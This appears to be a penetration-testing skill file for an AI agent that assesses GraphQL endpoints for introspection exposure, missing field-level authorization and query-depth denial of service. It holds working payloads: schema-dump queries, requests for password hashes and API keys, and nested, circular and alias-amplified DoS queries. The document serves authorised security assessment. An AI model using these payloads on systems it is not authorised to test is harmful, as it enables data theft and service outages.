---
name: graphql-depth-introspection
domain: api-security
category: api-security
tier: balanced
description: Assess GraphQL endpoints for introspection exposure, deep/circular query denial-of-service, and missing field-level authorization.
toolRefs:
  - httpRequest
  - parseResponse
  - graphqlIntrospect
  - recordEvidence
  - writeFinding
  - getTargetSummary
triggers:
  - graphql introspection exposure
  - graphql depth limit dos
  - graphql field authorization
  - graphql schema enumeration
contextBoosts: []
toolChains: []
compositionRules: {}
mitreAttack:
  - T1190
  - T1083
  - T1078
owaspRefs:
  - A01:2021
  - A04:2021
  - A05:2021
---

# GraphQL Introspection, Depth & Authorization

## When to Use
Use against any GraphQL endpoint (single `/graphql` POST, often JSON body). Target three issues: schema disclosure via introspection, resource exhaustion via deeply nested/circular queries, and authorization gaps on specific fields.

## Detection Approach
1. **Confirm GraphQL.** Send a simple `__typename` query; a structured JSON response confirms the engine.

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query":"{ __typename }"}
```

2. **Test introspection.** Issue an introspection query (`__schema { types { name fields { name } } }`) via `graphqlIntrospect`. If it returns the full schema, the surface is fully enumerated (information disclosure).

```graphql
{ __schema { types { name kind fields(includeDeprecated:true) { name type { name kind ofType { name } } } } } }
```

3. **Map sensitive types/fields.** From the schema, locate fields implying privilege (e.g. `users`, `password`, `internal`). Note which require auth.

```bash
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' \
  | jq -r '.. | .name? // empty' | sort -u
```

4. **Test field-level authorization.** As an unauthenticated or low-privilege user, request sensitive fields. If returned, authorization is missing at the field level.

```graphql
query {
  me { id email role }
  users { id email passwordHash apiKey }
  auditLogs(first: 50) { timestamp actor action }
}
```

5. **Test depth/circular DoS.** Build a deeply nested or self-referential alias-heavy query (repeatedly nesting a child that returns its parent). Measure response time and resource behavior via `parseResponse`; a hang or timeout indicates no depth limiting.

```graphql
query {
  user(id:"1") {
    friends { friends { friends { friends { friends { friends { email } } } } } }
  }
}
```

**Alias amplification (bypasses naive depth counters):**

```graphql
query {
  a1: user(id:"1") { email }
  a2: user(id:"2") { email }
  a3: user(id:"3") { email }
  ...
  a500: user(id:"500") { email }
}
```

**Circular fragment:**

```graphql
fragment A on User { friends { ...B } }
fragment B on User { friends { ...A } }
query { user(id:"1") { ...A } }
```

6. **Switch logic.** If introspection is disabled, try partial introspection via field-suggestions or error-driven schema inference. If depth is limited, test alias-based amplification instead.

```json
{"query":"{ user(id:\"1\") { usernam } }"}
```

**Suggestion response leaks real fields:**

```json
{"errors":[{"message":"Cannot query field \"usernam\" on type \"User\". Did you mean \"username\"?"}]}
```


## Pitfalls
- Assuming disabling introspection hides the schema — error messages and field suggestions can leak it.
- Only testing with a single alias; amplification requires many aliases/branches.
- Confusing a legitimately public field with an authorization gap.
- Treating a slow-but-completing query as safe — measure relative to baseline.

## Verification & Impact
- **Confirmed:** Introspection returns schema; privileged field readable without auth; deep query causes measurable degradation.
- **Suspected:** Schema partially inferable, or query latency rising without failure.
- Document schema exposure, the unauthorized field path, and DoS reproduction. Use `writeFinding` with introspection/response evidence.

## Key Concepts
| Term | Meaning |
|------|---------|
| Introspection | Schema self-description query |
| Depth attack | Deeply nested query exhaustion |
| Alias amplification | Many renamed fields in one query |
